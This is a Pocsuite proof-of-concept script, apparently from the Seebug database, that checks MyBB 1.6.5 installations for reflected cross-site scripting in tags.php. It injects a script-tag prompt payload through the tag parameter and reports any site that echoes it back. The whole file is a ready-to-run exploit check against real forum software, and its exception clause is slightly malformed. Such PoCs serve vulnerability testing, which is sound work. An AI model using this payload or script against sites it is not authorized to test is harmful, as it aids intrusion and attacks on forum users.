#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

import requests

'''
原始利用链接：
/tags.php?tag="><script>prompt(/SEBUG@TEST/)</script>
'''

class TestPOC(POCBase):
    vulID = '26119'  # ssvid
    version = '1.0'
    author = ['XXXX']
    vulDate = ''
    createDate = '2016-01-25'
    updateDate = '2016-01-25'
    references = ['http://www.seebug.org/vuldb/ssvid-26119']
    name = 'MyBB 1.6.5 suffers from a cross site scripting vulnerability'
    appPowerLink = 'http://www.mybboard.net/'
    appName = 'MyBB'
    appVersion = '1.6.5'
    vulType = 'XSS'
    desc = '''
    MyBB 1.6.5 tags.php 存在跨站脚本漏洞
    '''
    samples = ['']
    
    def _verify(self):
        result = {}

        # 较之前poc加入rstip()使URL规范化
        # 使用prompt(/SEBUG@TEST/)替代prompt("SEBUG@TEST"),因为发现有的网站会转义双引号
        vulurl = self.url.rstrip('/') + '/tags.php?tag="><script>prompt(/SEBUG@TEST/)</script>'

        # 较之前poc加入异常处理机制
        try:
            # 较之前poc加入过期时间，禁用SSL证书认证：降低等待时间、排除SSL认证失败错误
            r = requests.get(vulurl,timeout=15,verify=False)
            if '<script>prompt(/SEBUG@TEST/)</script>' in r.content:
                result['XSSInfo'] = {}
                result['XSSInfo']['URL'] = r.url
        except Exception (e):
            raise e

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)